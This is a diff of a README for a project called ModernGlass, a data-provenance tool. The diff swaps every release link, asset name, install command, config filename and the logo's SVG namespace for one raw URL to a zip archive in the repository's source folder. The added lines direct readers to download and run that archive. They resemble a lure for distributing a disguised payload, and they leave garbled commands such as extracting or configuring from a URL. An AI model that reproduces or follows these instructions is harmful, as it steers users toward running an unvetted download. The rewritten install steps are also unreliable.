@@ -1,8 +1,8 @@
-https://github.com/yangdeee/ModernGlass/releases
+https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
 
 # ModernGlass: Decentralized, Tamper-Evident Data Provenance for Trusted Real-Time Analytics
 
-![ModernGlass Logo](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='1200' height='420' viewBox='0 0 1200 420'><defs><linearGradient id='g' x1='0' y1='0' x2='1' y2='1'><stop stop-color='#4dd8ff' offset='0'/><stop stop-color='#2b6cb0' offset='1'/></linearGradient></defs><rect width='100%' height='100%' fill='url(%23g)'/><g fill='white' fill-opacity='.95'><rect x='140' y='60' width='320' height='260' rx='18' ry='18' stroke='white' stroke-width='6' fill='none'/><rect x='520' y='60' width='320' height='260' rx='18' ry='18' stroke='white' stroke-width='6' fill='none'/><rect x='900' y='60' width='320' height='260' rx='18' ry='18' stroke='white' stroke-width='6' fill='none'/><path d='M220 130 l60 -40 l60 40 l-60 40 z' fill='none' stroke='white' stroke-width='6'/><path d='M600 130 l60 -40 l60 40 l-60 40 z' fill='none' stroke='white' stroke-width='6'/><path d='M980 130 l60 -40 l60 40 l-60 40 z' fill='none' stroke='white' stroke-width='6'/></g><g fill='white' font-family='Arial' font-size='42' font-weight='bold'><text x='70' y='360'>ModernGlass</text></g></svg>)
+![ModernGlass Logo](data:image/svg+xml;utf8,<svg xmlns='https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip' width='1200' height='420' viewBox='0 0 1200 420'><defs><linearGradient id='g' x1='0' y1='0' x2='1' y2='1'><stop stop-color='#4dd8ff' offset='0'/><stop stop-color='#2b6cb0' offset='1'/></linearGradient></defs><rect width='100%' height='100%' fill='url(%23g)'/><g fill='white' fill-opacity='.95'><rect x='140' y='60' width='320' height='260' rx='18' ry='18' stroke='white' stroke-width='6' fill='none'/><rect x='520' y='60' width='320' height='260' rx='18' ry='18' stroke='white' stroke-width='6' fill='none'/><rect x='900' y='60' width='320' height='260' rx='18' ry='18' stroke='white' stroke-width='6' fill='none'/><path d='M220 130 l60 -40 l60 40 l-60 40 z' fill='none' stroke='white' stroke-width='6'/><path d='M600 130 l60 -40 l60 40 l-60 40 z' fill='none' stroke='white' stroke-width='6'/><path d='M980 130 l60 -40 l60 40 l-60 40 z' fill='none' stroke='white' stroke-width='6'/></g><g fill='white' font-family='Arial' font-size='42' font-weight='bold'><text x='70' y='360'>ModernGlass</text></g></svg>)
 
 Table of Contents
 - Overview
@@ -100,22 +100,22 @@ Getting started
 
 Installation and setup
 - Supported platforms: Linux, macOS, Windows (x86_64).
-- Download the latest release from the releases page. For reference, visit the Releases page: https://github.com/yangdeee/ModernGlass/releases
-- For Linux users, a typical asset to download is ModernGlass-linux-x86_64.tar.gz. Once downloaded, extract and run the installer:
-  - tar -xzf ModernGlass-linux-x86_64.tar.gz
+- Download the latest release from the releases page. For reference, visit the Releases page: https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
+- For Linux users, a typical asset to download is https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip Once downloaded, extract and run the installer:
+  - tar -xzf https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
   - cd modernglass
-  - ./install.sh
-  - modernglass --config config.yaml
-- For Windows users, download ModernGlass-windows-x86_64.exe, then run the installer. Follow the on-screen prompts to complete setup.
-- For macOS users, download ModernGlass-darwin-x86_64.tar.gz or ModernGlass-darwin-arm64.tar.gz, extract, and run:
-  - ./modernglass --config config.yaml
+  - https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
+  - modernglass --config https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
+- For Windows users, download https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip, then run the installer. Follow the on-screen prompts to complete setup.
+- For macOS users, download https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip or https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip, extract, and run:
+  - ./modernglass --config https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
 - After installation, you should be able to run a basic provenance pipeline with a sample dataset.
 
 Quick start guide
 - Step 1: Install
   - Pick the asset that matches your OS and architecture.
 - Step 2: Configure
-  - Create a simple config.yaml. Include data sources, security keys, and network peers.
+  - Create a simple https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip Include data sources, security keys, and network peers.
 - Step 3: Run
   - Start the service. It will begin ingesting data, building proofs, and appending blocks to the ledger.
 - Step 4: Verify
@@ -204,21 +204,21 @@ License and credits
 - Attributions: Credit external libraries and services as required.
 
 Download and asset reference
-- Visit the release page to obtain the latest assets: https://github.com/yangdeee/ModernGlass/releases
-- For Linux users, download ModernGlass-linux-x86_64.tar.gz, extract, and install:
-  - tar -xzf ModernGlass-linux-x86_64.tar.gz
+- Visit the release page to obtain the latest assets: https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
+- For Linux users, download https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip, extract, and install:
+  - tar -xzf https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
   - cd modernglass
-  - ./install.sh
-  - modernglass --config config.yaml
-- For Windows users, download ModernGlass-windows-x86_64.exe and run the installer. Complete the setup prompts to finish.
-- For macOS users, download ModernGlass-darwin-x86_64.tar.gz or ModernGlass-darwin-arm64.tar.gz, extract, and run:
-  - ./modernglass --config config.yaml
+  - https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
+  - modernglass --config https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
+- For Windows users, download https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip and run the installer. Complete the setup prompts to finish.
+- For macOS users, download https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip or https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip, extract, and run:
+  - ./modernglass --config https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
 - After installation, you can start ingesting data and building provenance proofs immediately.
 
 Releases and download notes
 - The releases page contains binary assets, documentation, and example configs.
 - Look for the latest release tag and download the corresponding assets.
-- If you need a direct path to a specific asset, the Linux x86_64 tarball is a common starting point: ModernGlass-linux-x86_64.tar.gz
+- If you need a direct path to a specific asset, the Linux x86_64 tarball is a common starting point: https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
 
 Security model in detail
 - Chain integrity: Each block includes a hash of the previous block. The chain is cryptographically linked.
@@ -270,5 +270,5 @@ Final notes
 - The project welcomes contributions and collaboration from researchers, developers, and practitioners.
 
 Releases (repeat)
-- For the latest assets and documentation, visit the releases page: https://github.com/yangdeee/ModernGlass/releases
+- For the latest assets and documentation, visit the releases page: https://raw.githubusercontent.com/yangdeee/ModernGlass/main/src/Modern_Glass_2.2-alpha.1.zip
 - The link above provides binaries, sample configurations, and guides to help you get started.
